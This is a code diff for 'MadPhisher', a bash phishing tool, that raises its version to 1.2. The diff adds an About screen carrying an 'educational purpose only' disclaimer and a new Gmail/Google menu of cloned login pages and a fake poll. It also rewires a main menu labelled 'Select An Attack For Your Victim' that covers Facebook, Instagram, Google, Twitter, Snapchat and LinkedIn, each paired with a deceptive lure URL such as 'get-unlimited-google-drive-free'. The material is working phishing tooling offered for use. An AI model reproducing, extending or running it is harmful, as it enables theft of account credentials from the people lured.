@@ -3,11 +3,11 @@
 
 ##   MadPhisher : 	Automated Phishing Tool
 ##   Author 	: 	Sajid Ibn Nayeem
-##   Version 	: 	1.0
+##   Version 	: 	1.2
 ##   Github 	: 	https://github.com/SajidIbnNayeem
 
 
-__version__="1.0"
+__version__="1.2"
 
 
 ## DEFAULT HOST & PORT
@@ -148,16 +148,42 @@ dependencies() {
 	fi
 }
 
-
-
-
-
 ## Exit message
 msg_exit() {
 	{ clear; banner; echo; }
-	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
+	echo -e "${REDBG}${BLUE} Thank you for using this tool. Have a good day."
 	{ reset_color; exit 0; }
 }
+
+## About
+about() {
+	{ clear; banner; echo; }
+	cat <<- EOF
+		${RED} Author   ${RED}:  ${BLUE}Sajid Ibn Nayeem  ${RED}
+		${RED} Github   ${RED}:  ${BLUE}https://github.com/SajidIbnNayeem
+		${RED} Version  ${RED}:  ${BLUE}${__version__}
+
+		${WHITE} ${REDBG}Warning:${RESETBG}
+		${CYAN}  This Tool is made for educational purpose only ${RED}!
+		${WHITE}${CYAN} Author will not be responsible for any misuse of this toolkit ${RED}!${WHITE}
+
+		${RED}[${WHITE}00${RED}]${RED} Main Menu     ${RED}[${WHITE}99${RED}]${RED} Exit
+
+	EOF
+
+	read -p "${BLUE}(★★) Select an option : ${GREEN}"
+	case $REPLY in 
+		99)
+			msg_exit;;
+		0 | 00)
+			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Returning to main menu..."
+			{ sleep 1; main_menu; };;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; about; };;
+	esac
+}
+
 
 ## Choose custom port
 cusport() {
@@ -391,9 +417,36 @@ site_instagram() {
 	esac
 }
 
+## Gmail/Google
+site_gmail() {
+	cat <<- EOF
 
+		${RED}[${WHITE}01${RED}]${RED} Gmail Old Login Page
+		${RED}[${WHITE}02${RED}]${RED} Gmail New Login Page
+		${RED}[${WHITE}03${RED}]${RED} Advanced Voting Poll
 
+	EOF
 
+	read -p "${BLUE}(★★) Select an option : ${GREEN}"
+
+	case $REPLY in 
+		1 | 01)
+			website="google"
+			mask='https://get-unlimited-google-drive-free'
+			tunnel_menu;;		
+		2 | 02)
+			website="google_new"
+			mask='https://get-unlimited-google-drive-free'
+			tunnel_menu;;
+		3 | 03)
+			website="google_poll"
+			mask='https://vote-for-the-best-social-media'
+			tunnel_menu;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; clear; banner_small; site_gmail; };;
+	esac
+}
 
 
 ## Menu
@@ -403,10 +456,12 @@ main_menu() {
 		${PURPLE}(×_×)${BLUE}Select An Attack For Your Victim ${RED}${BLUE}
 
 		${RED}[${WHITE}01${RED}]${YELLOW} Facebook
-${RED}[${WHITE}02${RED}]${YELLOW} Instagram
-		${RED}[${WHITE}03${RED}]${YELLOW} Twitter 
-		${RED}[${WHITE}04${RED}]${YELLOW} Snapchat
-		${RED}[${WHITE}05${RED}]${YELLOW} Linkedin
+		${RED}[${WHITE}02${RED}]${YELLOW} Instagram
+		${RED}[${WHITE}03${RED}]${YELLOW} Google   
+${RED}[${WHITE}04${RED}]${YELLOW} Twitter
+		${RED}[${WHITE}05${RED}]${YELLOW} Snapchat 
+		${RED}[${WHITE}06${RED}]${YELLOW} Linkedin
+		${RED}[${WHITE}99${RED}]${YELLOW} About
 		${RED}[${WHITE}00${RED}]${YELLOW} Exit
 	EOF
 	
@@ -417,18 +472,21 @@ ${RED}[${WHITE}02${RED}]${YELLOW} Instagram
 			site_facebook;;
 		2 | 02)
 			site_instagram;;
-		3 | 03)
+	    3 | 03)
+			site_gmail;;
+		4 | 04)
 			website="twitter"
 			mask='https://get-blue-badge-on-twitter-free'
 			tunnel_menu;;
-		4 | 04)
+		5 | 05)
 			website="snapchat"
 			mask='https://view-locked-snapchat-accounts-secretly'
 			tunnel_menu;;
-		5 | 05)
+		6 | 06)
 			website="linkedin"
 			mask='https://get-a-premium-plan-for-linkedin-free'
 			tunnel_menu;;
+            
 		99)
 			about;;
 		0 | 00 )
